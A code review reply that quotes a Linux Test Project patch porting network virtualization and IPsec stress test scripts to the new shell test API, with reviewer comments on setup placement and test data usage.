-> +++ b/testcases/network/stress/tcp/tcp_ipsec_vti.sh
-> @@ -1,27 +1,20 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=tcp_ipsec_vti
-> -TST_TOTAL=3
->  TST_NEEDS_TMPDIR=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=tst_ipsec_setup_vti
-> +TST_CLEANUP=tst_ipsec_cleanup
-> +. ipsec_lib.sh
->  
->  max_requests=10
->  
-> -. ipsec_lib.sh
-> -
->  do_test()
->  {
-> -	for p in $IPSEC_SIZE_ARRAY; do
-> -		tst_netload -H $ip_rmt_tun -n $p -N $p \
-> -			-r $IPSEC_REQUESTS -R $max_requests
-> -	done
-> +	tst_netload -H $ip_rmt_tun -n $2 -N $2 -r $IPSEC_REQUESTS -R $max_requests
->  }
->  
-> -tst_ipsec_setup_vti
-> -
-> -do_test
-> -
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/stress/udp/udp_ipsec.sh b/testcases/network/stress/udp/udp_ipsec.sh
-> index 9c46fc6c0..b59070ebe 100755
-> --- a/testcases/network/stress/udp/udp_ipsec.sh
-> +++ b/testcases/network/stress/udp/udp_ipsec.sh
-> @@ -1,26 +1,22 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=udp_ipsec
-> -TST_TOTAL=6
->  TST_NEEDS_TMPDIR=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> -
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=tst_ipsec_setup
-> +TST_CNT=2
-> +TST_CLEANUP=tst_ipsec_cleanup
->  . ipsec_lib.sh
->  
->  do_test()
->  {
-> -	for p in $IPSEC_SIZE_ARRAY; do
-> -		tst_netload -H $(tst_ipaddr rhost) -T $1 -n $p -N $p \
-> -			-r $IPSEC_REQUESTS
-> -	done
-> -}
-> +	local type="udp"
-> +	[ $1 -eq 2 ] && type="udp_lite"
->  
-> -tst_ipsec_setup
-> -
-> -do_test udp
-> -do_test udp_lite
-> +	tst_netload -H $(tst_ipaddr rhost) -T $type -n $2 -N $2 -r $IPSEC_REQUESTS
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/stress/udp/udp_ipsec_vti.sh b/testcases/network/stress/udp/udp_ipsec_vti.sh
-> index 1b138afb6..65b48eaa4 100755
-> --- a/testcases/network/stress/udp/udp_ipsec_vti.sh
-> +++ b/testcases/network/stress/udp/udp_ipsec_vti.sh
-> @@ -1,26 +1,22 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=udp_ipsec_vti
-> -TST_TOTAL=6
->  TST_NEEDS_TMPDIR=1
-> -TST_CLEANUP="tst_ipsec_cleanup"
-> -
-> +TST_TESTFUNC=do_test
-> +TST_CNT=2
-> +TST_SETUP=tst_ipsec_setup_vti
-> +TST_CLEANUP=tst_ipsec_cleanup
->  . ipsec_lib.sh
->  
->  do_test()
->  {
-> -	for p in $IPSEC_SIZE_ARRAY; do
-> -		tst_netload -H $ip_rmt_tun -T $1 -n $p -N $p \
-> -			-r $IPSEC_REQUESTS
-> -	done
-> -}
-> +	local type="udp"
-> +	[ $1 -eq 2 ] && type="udp_lite"
->  
-> -tst_ipsec_setup_vti
-> -
-> -do_test udp
-> -do_test udp_lite
-> +	tst_netload -H $ip_rmt_tun -T $type -n $2 -N $2 -r $IPSEC_REQUESTS
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/geneve01.sh b/testcases/network/virt/geneve01.sh
-> index 91d03883d..8ddb97258 100755
-> --- a/testcases/network/virt/geneve01.sh
-> +++ b/testcases/network/virt/geneve01.sh
-> @@ -1,10 +1,9 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2016-2017 Oracle and/or its affiliates.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  
-> -TCID=geneve01
-> -TST_TOTAL=1
->  TST_NEEDS_TMPDIR=1
->  TST_OPTS="hi:d:"
->  TST_PARSE_ARGS=virt_lib_parse_args
-> @@ -16,26 +15,29 @@ start_id=16700000
->  # that is why using here 'vxlan_*' library functions.
->  vxlan_dst_addr="uni"
->  
-> +TST_TESTFUNC=do_test
-> +TST_CLEANUP=virt_cleanup
->  . virt_lib.sh
->  
->  VIRT_PERF_THRESHOLD=${VIRT_PERF_THRESHOLD:-160}
->  [ "$VIRT_PERF_THRESHOLD" -lt 160 ] && VIRT_PERF_THRESHOLD=160
->  
-> -TST_CLEANUP="virt_cleanup"
-> -
-> -if [ -z $ip_local -o -z $ip_remote ]; then
-> -	tst_brkm TBROK "you must specify IP address"
-> -fi
-> -
-> -tst_resm TINFO "the same VNI must work"
-> -# VNI is 24 bits long, so max value, which is not reserved, is 0xFFFFFE
-> -vxlan_setup_subnet_$vxlan_dst_addr "id 0xFFFFFE" "id 0xFFFFFE"
-> -virt_netperf_msg_sizes
-> -virt_cleanup_rmt
-> -
-> -tst_resm TINFO "different VNI shall not work together"
-> -vxlan_setup_subnet_$vxlan_dst_addr "id 0xFFFFFE" "id 0xFFFFFD"
-> -virt_minimize_timeout
-> -virt_compare_netperf "fail"
-> -
-> -tst_exit
-> +do_test()
-> +{
-> +	if [ -z $ip_local -o -z $ip_remote ]; then
-> +		tst_brk TBROK "you must specify IP address"
-> +	fi
-> +
-> +	tst_res TINFO "the same VNI must work"
-> +	# VNI is 24 bits long, so max value, which is not reserved, is 0xFFFFFE
-> +	vxlan_setup_subnet_$vxlan_dst_addr "id 0xFFFFFE" "id 0xFFFFFE"
-> +	virt_netperf_msg_sizes
-> +	virt_cleanup_rmt
-> +
-> +	tst_res TINFO "different VNI shall not work together"
-> +	vxlan_setup_subnet_$vxlan_dst_addr "id 0xFFFFFE" "id 0xFFFFFD"
-> +	virt_minimize_timeout
-> +	virt_compare_netperf "fail"
-> +}
-> +
-> +tst_run
-> diff --git a/testcases/network/virt/gre01.sh b/testcases/network/virt/gre01.sh
-> index efb78a940..3173d1b7c 100755
-> --- a/testcases/network/virt/gre01.sh
-> +++ b/testcases/network/virt/gre01.sh
-> @@ -1,5 +1,6 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2015-2017 Oracle and/or its affiliates.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
-> @@ -7,23 +8,30 @@
->  # tunnel between two hosts, then will compare TCP performance
->  # with and without GRE using ping or netstress test.
->  
-> -TCID=gre01
-> -TST_TOTAL=1
->  TST_NEEDS_TMPDIR=1
-> -
-> -virt_type="gre"
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=do_setup
-> +TST_CLEANUP=virt_cleanup
->  . virt_lib.sh
->  
-> -TST_CLEANUP="virt_cleanup"
-> +do_setup()
-> +{
-> +	virt_type="gre"
-> +	[ "$TST_IPV6" ] && virt_type="ip6gre"
-> +	virt_lib_setup
-> +}
->  
-> -if [ -z $ip_local -o -z $ip_remote ]; then
-> -	tst_brkm TBROK "you must specify IP address"
-> -fi
-> +do_test()
-> +{
-> +	if [ -z $ip_local -o -z $ip_remote ]; then
-> +		tst_brk TBROK "you must specify IP address"
-> +	fi
->  
-> -tst_resm TINFO "test $virt_type"
-> -virt_setup "local $(tst_ipaddr) remote $(tst_ipaddr rhost) dev $(tst_iface)" \
-> -"local $(tst_ipaddr rhost) remote $(tst_ipaddr) dev $(tst_iface rhost)"
-> +	tst_res TINFO "test $virt_type"
-> +	virt_setup "local $(tst_ipaddr) remote $(tst_ipaddr rhost) dev $(tst_iface)" \
-> +	"local $(tst_ipaddr rhost) remote $(tst_ipaddr) dev $(tst_iface rhost)"
->
-
-Shouldn't it be done in setup function?
-
-  
-> -virt_netperf_msg_sizes
-> +	virt_netperf_msg_sizes
-> +}
->  
-
-And TST_TESTFUNC=virt_netperf_msg_sizes ?
-
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/ipvlan01.sh b/testcases/network/virt/ipvlan01.sh
-> index 426b2cb6b..f49b5ed75 100755
-> --- a/testcases/network/virt/ipvlan01.sh
-> +++ b/testcases/network/virt/ipvlan01.sh
-> @@ -1,20 +1,18 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2015 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
->  # Local test, check if we can create and then delete ipvlan
->  # interface multiple times.
->  
-> -TCID=ipvlan01
-> -TST_TOTAL=2
-> +TST_TEST_DATA="mode l2,mode l3"
-> +TST_TEST_DATA_IFS=","
-> +TST_TESTFUNC=virt_test_02
->  
->  virt_type="ipvlan"
->  
->  . virt_lib.sh
->  
-> -options="mode l2,mode l3"
-> -
-> -virt_test_02 "$options"
-> -
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/macsec01.sh b/testcases/network/virt/macsec01.sh
-> index cf038e7ca..3d8815b27 100755
-> --- a/testcases/network/virt/macsec01.sh
-> +++ b/testcases/network/virt/macsec01.sh
-> @@ -1,5 +1,6 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
-> @@ -7,13 +8,16 @@
->  # with default MACsec configuration, compare performance with similar
->  # IPsec configuration on master interface.
->  
-> -TCID=macsec01
-> -TST_TOTAL=16
-> -TST_NEEDS_TMPDIR=1
-> -
->  virt_type="macsec"
->  VIRT_PERF_THRESHOLD=${VIRT_PERF_THRESHOLD:-100}
-> +IPSEC_MODE="transport"
-> +IPSEC_PROTO="ah"
->  
-> +TST_NEEDS_TMPDIR=1
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=ipsec_lib_setup
-> +IPSEC_LIB_IGNORE_IPSEC_SIZE_ARRAY=1
-> +TST_CLEANUP=cleanup
->  . ipsec_lib.sh
->  . virt_lib.sh
->  
-> @@ -22,15 +26,15 @@ cleanup()
->  	virt_cleanup
->  	tst_ipsec_cleanup
->  }
-> -TST_CLEANUP="cleanup"
->  
-> -IPSEC_MODE=transport
-> -IPSEC_PROTO=ah
-> -tst_resm TINFO "setup IPsec $IPSEC_MODE/$IPSEC_PROTO $EALGO"
-> -tst_ipsec lhost $(tst_ipaddr) $(tst_ipaddr rhost)
-> -tst_ipsec rhost $(tst_ipaddr rhost) $(tst_ipaddr)
-> +do_test()
-> +{
-> +	tst_res TINFO "setup IPsec $IPSEC_MODE/$IPSEC_PROTO $EALGO"
-> +	tst_ipsec lhost $(tst_ipaddr) $(tst_ipaddr rhost)
-> +	tst_ipsec rhost $(tst_ipaddr rhost) $(tst_ipaddr)
->  
-> -virt_macsec_setup
-> -virt_netperf_msg_sizes
-> +	virt_macsec_setup
-
-The same is here, may be better to move it to setup?
-
-> +	virt_netperf_msg_sizes
-> +}
-> 
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/macsec02.sh b/testcases/network/virt/macsec02.sh
-> index 63c035e44..ba8c38654 100755
-> --- a/testcases/network/virt/macsec02.sh
-> +++ b/testcases/network/virt/macsec02.sh
-> @@ -1,5 +1,6 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
-> @@ -7,13 +8,17 @@
->  # with enabled frame encryption and replay protection, compare
->  # performance with similar IPsec configuration on master interface.
->  
-> -TCID=macsec02
-> -TST_TOTAL=16
-> -TST_NEEDS_TMPDIR=1
-> -
->  virt_type="macsec"
->  VIRT_PERF_THRESHOLD=${VIRT_PERF_THRESHOLD:-100}
-> +IPSEC_MODE="transport"
-> +IPSEC_PROTO="esp_aead"
-> +EALGO="aes"
->  
-> +TST_NEEDS_TMPDIR=1
-> +TST_TESTFUNC=do_test
-> +TST_SETUP=ipsec_lib_setup
-> +IPSEC_LIB_IGNORE_IPSEC_SIZE_ARRAY=1
-> +TST_CLEANUP=cleanup
->  . ipsec_lib.sh
->  . virt_lib.sh
->  
-> @@ -22,16 +27,15 @@ cleanup()
->  	virt_cleanup
->  	tst_ipsec_cleanup
->  }
-> -TST_CLEANUP="cleanup"
->  
-> -IPSEC_MODE=transport
-> -IPSEC_PROTO=esp_aead
-> -EALGO=aes
-> -tst_resm TINFO "setup IPsec $IPSEC_MODE/$IPSEC_PROTO $EALGO"
-> -tst_ipsec lhost $(tst_ipaddr) $(tst_ipaddr rhost)
-> -tst_ipsec rhost $(tst_ipaddr rhost) $(tst_ipaddr)
-> +do_test()
-> +{
-> +	tst_res TINFO "setup IPsec $IPSEC_MODE/$IPSEC_PROTO $EALGO"
-> +	tst_ipsec lhost $(tst_ipaddr) $(tst_ipaddr rhost)
-> +	tst_ipsec rhost $(tst_ipaddr rhost) $(tst_ipaddr)
->  
-> -virt_macsec_setup "replay on window 300 encrypt on protect on"
-> -virt_netperf_msg_sizes
-> +	virt_macsec_setup "replay on window 300 encrypt on protect on"
-> +	virt_netperf_msg_sizes
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/macvlan01.sh b/testcases/network/virt/macvlan01.sh
-> index f37851f50..e739fae97 100755
-> --- a/testcases/network/virt/macvlan01.sh
-> +++ b/testcases/network/virt/macvlan01.sh
-> @@ -1,20 +1,21 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2015 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
->  # Local test, check if we can create and then delete macvlan
->  # interface multiple times.
->  
-> -TCID=macvlan01
-> -TST_TOTAL=4
-> -
->  virt_type="macvlan"
-> -
-> -. virt_lib.sh
-> -
->  options="mode private,mode vepa,mode bridge,mode passthru"
-
-Why not to use TST_TEST_DATA here?
-
-> +TST_CNT=4
-
-Looks like we don't need TST_CNT here.
-
-> +TST_TESTFUNC=do_test
-
-TST_TESTFUNC=virt_test_02
-
-> +. virt_lib.sh
->  
-> -virt_test_02 "$options"
-> +do_test()
-> +{
-> +	virt_test_02 "$options"
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/macvtap01.sh b/testcases/network/virt/macvtap01.sh
-> index 21fd96777..654cf30bd 100755
-> --- a/testcases/network/virt/macvtap01.sh
-> +++ b/testcases/network/virt/macvtap01.sh
-> @@ -1,20 +1,21 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2015 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
->  # Local test, check if we can create and then delete macvtap
->  # interface multiple times.
->  
-> -TCID=macvtap01
-> -TST_TOTAL=4
-> -
->  virt_type="macvtap"
-> -
-> -. virt_lib.sh
-> -
->  options="mode private,mode vepa,mode bridge,mode passthru"
-
-Here as well.
-
-> +TST_CNT=4
-> +TST_TESTFUNC=do_test
-> +. virt_lib.sh
->  
-> -virt_test_02 "$options"
-> +do_test()
-> +{
-> +	virt_test_02 "$options"
-> +}
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/virt_lib.sh b/testcases/network/virt/virt_lib.sh
-> index eaec33d8f..9b21f6201 100644
-> --- a/testcases/network/virt/virt_lib.sh
-> +++ b/testcases/network/virt/virt_lib.sh
-> @@ -1,5 +1,6 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2014-2017 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
-> @@ -15,30 +16,52 @@
->  #          them in cleanup function. See "start_vni" variable which can
->  #          solve it.
->  
-> +TST_SETUP="${TST_SETUP:-virt_lib_setup}"
-> +TST_CLEANUP="${TST_CLEANUP:-cleanup_vifaces}"
-> +trap "tst_brk TBROK 'test interrupted'" INT
-> +
-> +virt_lib_usage()
-> +{
-> +	echo "i n     start ID to use"
-> +	echo "d x     VxLAN destination address, 'uni' or 'multi'"
-> +}
-> +
->  virt_lib_parse_args()
->  {
->  	case "$1" in
-> -	h)
-> -		echo "Usage:"
-> -		echo "h        help"
-> -		echo "i n      start ID to use"
-> -		echo "d x      VxLAN destination address, 'uni' or 'multi'"
-> -		echo "6        run over IPv6"
-> -		exit 0
-> -	;;
->  	i) start_id=$2 ;;
->  	d) vxlan_dst_addr=$2 ;;
-> -	*)
-> -		tst_brkm TBROK "unknown option: $1"
-> +	esac
-> +}
-> +
-> +virt_lib_setup()
-> +{
-> +	case "$virt_type" in
-> +	vxlan|geneve)
-> +		if tst_kvcmp -lt "3.8"; then
-> +			tst_brk TCONF "test must be run with kernel 3.8 or newer"
-> +		fi
-> +
-> +		if [ "$TST_IPV6" ] && tst_kvcmp -lt "3.12"; then
-> +			tst_brk TCONF "test must be run with kernels >= 3.12"
-> +		fi
-> +
-> +		# newer versions of 'ip' complain if this option not set
-> +		ip li add type vxlan help 2>&1 | grep -q dstport && vxlan_dstport=1
->  	;;
->  	esac
-> +
-> +	tst_check_cmds "ip"
-> +
-> +	virt_add ltp_v0 || \
-> +		tst_brk TCONF "iproute2 or kernel doesn't support $virt_type"
-> +
-> +	ROD_SILENT "ip link delete ltp_v0"
->  }
->  
-> -TST_USE_LEGACY_API=1
-> +TST_NEEDS_ROOT=1
->  . tst_net.sh
->  
-> -[ -n "$TST_IPV6" -a "$virt_type" = "gre" ] && virt_type="ip6gre"
-> -
->  ip_local=$(tst_ipaddr)
->  ip_virt_local="$(TST_IPV6= tst_ipaddr_un)"
->  ip6_virt_local="$(TST_IPV6=6 tst_ipaddr_un)"
-> @@ -53,7 +76,7 @@ vxlan_dstport=0
->  
->  cleanup_vifaces()
->  {
-> -	tst_resm TINFO "cleanup virtual interfaces..."
-> +	tst_res TINFO "cleanup virtual interfaces..."
->  	local viface=`ip li | sed -nE 's/^[0-9]+: (ltp_v[0-9]+)[@:].+/\1/p'`
->  	for vx in $viface; do
->  		ip link delete $vx
-> @@ -73,12 +96,8 @@ virt_cleanup_rmt()
->  virt_cleanup()
->  {
->  	virt_cleanup_rmt
-> -	[ "$TST_NEEDS_TMPDIR" = 1 ] && tst_rmdir
->  }
->  
-> -TST_CLEANUP="cleanup_vifaces"
-> -trap "tst_brkm TBROK 'test interrupted'" INT
-> -
->  virt_add()
->  {
->  	local vname=$1
-> @@ -138,11 +157,11 @@ virt_multiple_add_test()
->  	local opt="$@"
->  	local max=$(($start_id + $NS_TIMES - 1))
->  
-> -	tst_resm TINFO "add $NS_TIMES $virt_type, then delete"
-> +	tst_res TINFO "add $NS_TIMES $virt_type, then delete"
->  
->  	for i in $(seq $start_id $max); do
->  		virt_add ltp_v$i id $i $opt || \
-> -			tst_brkm TFAIL "failed to create 'ltp_v0 $opt'"
-> +			tst_brk TFAIL "failed to create 'ltp_v0 $opt'"
->  		ROD_SILENT "ip link set ltp_v$i up"
->  	done
->  
-> @@ -151,7 +170,7 @@ virt_multiple_add_test()
->  		ROD_SILENT "ip link delete ltp_v$i"
->  	done
->  
-> -	tst_resm TPASS "done"
-> +	tst_res TPASS "done"
->  }
->  
->  virt_add_delete_test()
-> @@ -159,15 +178,15 @@ virt_add_delete_test()
->  	local opt="$@"
->  	local max=$(($NS_TIMES - 1))
->  
-> -	tst_resm TINFO "add/del $virt_type $NS_TIMES times"
-> +	tst_res TINFO "add/del $virt_type $NS_TIMES times"
->  
->  	for i in $(seq 0 $max); do
->  		virt_add ltp_v0 $opt || \
-> -			tst_brkm TFAIL "failed to create 'ltp_v0 $opt'"
-> +			tst_brk TFAIL "failed to create 'ltp_v0 $opt'"
->  		ROD_SILENT "ip link set ltp_v0 up"
->  		ROD_SILENT "ip link delete ltp_v0"
->  	done
-> -	tst_resm TPASS "done"
-> +	tst_res TPASS "done"
->  }
->  
->  virt_setup()
-> @@ -175,11 +194,11 @@ virt_setup()
->  	local opt="$1"
->  	local opt_r="${2:-$1}"
->  
-> -	tst_resm TINFO "setup local ${virt_type} with '$opt'"
-> +	tst_res TINFO "setup local ${virt_type} with '$opt'"
->  	virt_add ltp_v0 $opt || \
-> -		tst_brkm TBROK "failed to create 'ltp_v0 $opt'"
-> +		tst_brk TBROK "failed to create 'ltp_v0 $opt'"
->  
-> -	tst_resm TINFO "setup rhost ${virt_type} with '$opt_r'"
-> +	tst_res TINFO "setup rhost ${virt_type} with '$opt_r'"
->  	virt_add_rhost "$opt_r"
->  
->  	ROD_SILENT "ip addr add ${ip6_virt_local}/64 dev ltp_v0 nodad"
-> @@ -212,11 +231,11 @@ virt_minimize_timeout()
->  vxlan_setup_subnet_uni()
->  {
->  	if tst_kvcmp -lt "3.10"; then
-> -		tst_brkm TCONF "test must be run with kernel 3.10 or newer"
-> +		tst_brk TCONF "test must be run with kernel 3.10 or newer"
->  	fi
->  
->  	[ "$(ip li add type $virt_type help 2>&1 | grep remote)" ] || \
-> -		tst_brkm TCONF "iproute doesn't support remote unicast address"
-> +		tst_brk TCONF "iproute doesn't support remote unicast address"
->  
->  	local opt="$1 remote $(tst_ipaddr rhost)"
->  	local opt_r="$2 remote $(tst_ipaddr)"
-> @@ -265,26 +284,26 @@ virt_compare_netperf()
->  	tst_netload -H $ip_remote $opts -d res_ipv4
->  
->  	local lt="$(cat res_ipv4)"
-> -	tst_resm TINFO "time lan($lt) $virt_type IPv4($vt) and IPv6($vt6) ms"
-> +	tst_res TINFO "time lan($lt) $virt_type IPv4($vt) and IPv6($vt6) ms"
->  
->  	per=$(( $vt * 100 / $lt - 100 ))
->  	per6=$(( $vt6 * 100 / $lt - 100 ))
->  
->  	case "$virt_type" in
->  	vxlan|geneve)
-> -		tst_resm TINFO "IP4 $virt_type over IP$TST_IPVER slower by $per %"
-> -		tst_resm TINFO "IP6 $virt_type over IP$TST_IPVER slower by $per6 %"
-> +		tst_res TINFO "IP4 $virt_type over IP$TST_IPVER slower by $per %"
-> +		tst_res TINFO "IP6 $virt_type over IP$TST_IPVER slower by $per6 %"
->  	;;
->  	*)
-> -		tst_resm TINFO "IP4 $virt_type slower by $per %"
-> -		tst_resm TINFO "IP6 $virt_type slower by $per6 %"
-> +		tst_res TINFO "IP4 $virt_type slower by $per %"
-> +		tst_res TINFO "IP6 $virt_type slower by $per6 %"
->  	esac
->  
->  	if [ "$per" -ge "$VIRT_PERF_THRESHOLD" -o \
->  	     "$per6" -ge "$VIRT_PERF_THRESHOLD" ]; then
-> -		tst_resm TFAIL "Test failed, threshold: $VIRT_PERF_THRESHOLD %"
-> +		tst_res TFAIL "Test failed, threshold: $VIRT_PERF_THRESHOLD %"
->  	else
-> -		tst_resm TPASS "Test passed, threshold: $VIRT_PERF_THRESHOLD %"
-> +		tst_res TPASS "Test passed, threshold: $VIRT_PERF_THRESHOLD %"
->  	fi
->  }
->  
-> @@ -292,7 +311,7 @@ virt_check_cmd()
->  {
->  	$@ > /dev/null 2>&1
->  	if [ $? -ne 0 ]; then
-> -		tst_resm TCONF "'$@' option(s) not supported, skipping it"
-> +		tst_res TCONF "'$@' option(s) not supported, skipping it"
->  		return 1
->  	fi
->  	ROD_SILENT "ip li delete ltp_v0"
-> @@ -338,74 +357,25 @@ virt_netperf_msg_sizes()
->  
->  # Check if we can create then delete virtual interface n times.
->  # virt_test_01 [OPTIONS]
-> -# OPTIONS - different options separated by comma.
->  virt_test_01()
->  {
->  	start_id="${start_id:-1}"
->  	local opts="${1:-}"
-
-$opts is unused now
-
-> -	local n=0
-> -
-> -	while true; do
-> -		n=$((n + 1))
-> -		p="$(echo $opts | cut -d',' -f$n)"
-> -		if [ -z "$p" -a $n -gt 1 ]; then
-> -			break
-> -		fi
-> -
-> -		tst_resm TINFO "add $virt_type with '$p'"
-> -
-> -		virt_check_cmd virt_add ltp_v0 id 0 $p || continue
->  
-> -		virt_multiple_add_test "$p"
-> -	done
-> +	tst_res TINFO "add $virt_type with '$2'"
-> +	virt_check_cmd virt_add ltp_v0 id 0 $2 || return
-> +	virt_multiple_add_test "$2"
->  }
->  
->  # Check if we can create then delete virtual interface n times.
->  # virt_test_02 [OPTIONS]
-> -# OPTIONS - different options separated by comma.
->  virt_test_02()
->  {
->  	start_id="${start_id:-1}"
->  	local opts="${1:-}"
-
-And here.
-
-> -	local n=0
-> -
-> -	while true; do
-> -		n=$((n + 1))
-> -		p="$(echo $opts | cut -d',' -f$n)"
-> -		if [ -z "$p" -a $n -gt 1 ]; then
-> -			break
-> -		fi
-> -
-> -		tst_resm TINFO "add and then delete $virt_type with '$p'"
-> -
-> -		virt_check_cmd virt_add ltp_v0 $p || continue
->  
-> -		virt_add_delete_test "$p"
-> +	tst_res TINFO "add and then delete $virt_type with '$2'"
->  
-> -		start_id=$(($start_id + $NS_TIMES))
-> -	done
-> +	virt_check_cmd virt_add ltp_v0 $2 || return
-> +	virt_add_delete_test "$2"
->  }
-> -
-> -tst_require_root
-> -
-> -case "$virt_type" in
-> -vxlan|geneve)
-> -	if tst_kvcmp -lt "3.8"; then
-> -		tst_brkm TCONF "test must be run with kernel 3.8 or newer"
-> -	fi
-> -
-> -	if [ "$TST_IPV6" ] && tst_kvcmp -lt "3.12"; then
-> -		tst_brkm TCONF "test must be run with kernels >= 3.12"
-> -	fi
-> -
-> -	# newer versions of 'ip' complain if this option not set
-> -	ip li add type vxlan help 2>&1 | grep -q dstport && vxlan_dstport=1
-> -;;
-> -esac
-> -
-> -tst_check_cmds "ip"
-> -
-> -virt_add ltp_v0 || \
-> -	tst_brkm TCONF "iproute2 or kernel doesn't support $virt_type"
-> -
-> -ROD_SILENT "ip link delete ltp_v0"
-> diff --git a/testcases/network/virt/vlan01.sh b/testcases/network/virt/vlan01.sh
-> index 4dceae82f..69d2564cb 100755
-> --- a/testcases/network/virt/vlan01.sh
-> +++ b/testcases/network/virt/vlan01.sh
-> @@ -1,17 +1,11 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2015 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
->  # Local test, check if we can create multiple VLAN interfaces.
->  
-> -TCID=vlan01
-> -TST_TOTAL=9
-> -
-> -virt_type="vlan"
-> -
-> -. virt_lib.sh
-> -
->  p0="protocol 802.1Q"
->  p1="protocol 802.1ad"
->  lb0="loose_binding off"
-> @@ -19,9 +13,12 @@ lb1="loose_binding on"
->  rh0="reorder_hdr off"
->  rh1="reorder_hdr on"
->  
-> -options=" ,$p0 $lb0 $rh0,$p0 $lb0 $rh1,$p0 $lb1 $rh0,$p0 $lb1 $rh1,\
-> -$p1 $lb0 $rh0,$p1 $lb0 $rh1,$p1 $lb1 $rh0,$p1 $lb1 $rh1,"
-> +virt_type="vlan"
->  
-> -virt_test_01 "$options"
-> +TST_TEST_DATA=",$p0 $lb0 $rh0,$p0 $lb0 $rh1,$p0 $lb1 $rh0,$p0 $lb1 $rh1,\
-> +$p1 $lb0 $rh0,$p1 $lb0 $rh1,$p1 $lb1 $rh0,$p1 $lb1 $rh1"
-> +TST_TEST_DATA_IFS=","
-> +TST_TESTFUNC=virt_test_01
-> +. virt_lib.sh
->  
-> -tst_exit
-> +tst_run
-> diff --git a/testcases/network/virt/vlan02.sh b/testcases/network/virt/vlan02.sh
-> index 2b84a7cd0..04a8a5c60 100755
-> --- a/testcases/network/virt/vlan02.sh
-> +++ b/testcases/network/virt/vlan02.sh
-> @@ -1,18 +1,20 @@
->  #!/bin/sh
->  # SPDX-License-Identifier: GPL-2.0-or-later
-> +# Copyright (c) 2018 Petr Vorel <pvorel@suse.cz>
->  # Copyright (c) 2015 Oracle and/or its affiliates. All Rights Reserved.
->  # Author: Alexey Kodanev <alexey.kodanev@oracle.com>
->  #
->  # Local test, check if we can create and then delete VLAN
->  # interface 4095 times.
->  
-> -TCID=vlan02
-> -TST_TOTAL=1
-> -
->  virt_type="vlan"
->  
-> +TST_TESTFUNC=do_test
-
-Shouldn't it be virt_add_delete_test with TST_TEST_DATA?
-
->  . virt_lib.sh
->  
-> -virt_add_delete_test "id 4094"
-> +do_test()
-> +{
-> +	virt_add_delete_test "id 4094"
-> +}
->  
-> -tst_exit
-> +tst_run
